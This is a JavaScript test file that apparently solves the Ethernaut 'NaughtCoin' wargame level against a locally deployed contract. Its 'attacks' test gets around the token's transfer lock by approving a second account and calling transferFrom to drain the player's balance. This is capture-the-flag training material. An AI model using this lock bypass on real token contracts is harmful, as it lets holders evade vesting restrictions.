const { expect } = require("chai");
var tools = require("./tools");

describe("15NaughtCoin", function () {
  let player, levelOwner, levelContract;
  it("setup", async function () {
    [player, levelOwner] = await ethers.getSigners();
    const Contract = await ethers.getContractFactory("NaughtCoin", levelOwner);
    levelContract = await Contract.deploy(player.address);
    await levelContract.deployed();

    //检查原始
    expect(await levelContract.balanceOf(player.address)).to.above(0);
  });

  it("attacks", async function () {
    let playerBalance = await levelContract.balanceOf(player.address);
    let otherUser = (await ethers.getSigners())[5];
    await levelContract
      .connect(player)
      .approve(otherUser.address, playerBalance);
    await levelContract
      .connect(otherUser)
      .transferFrom(player.address, otherUser.address, playerBalance);
  });

  it("check", async function () {
    //检查通过条件
    expect(await levelContract.balanceOf(player.address)).to.equal(0);
  });
});
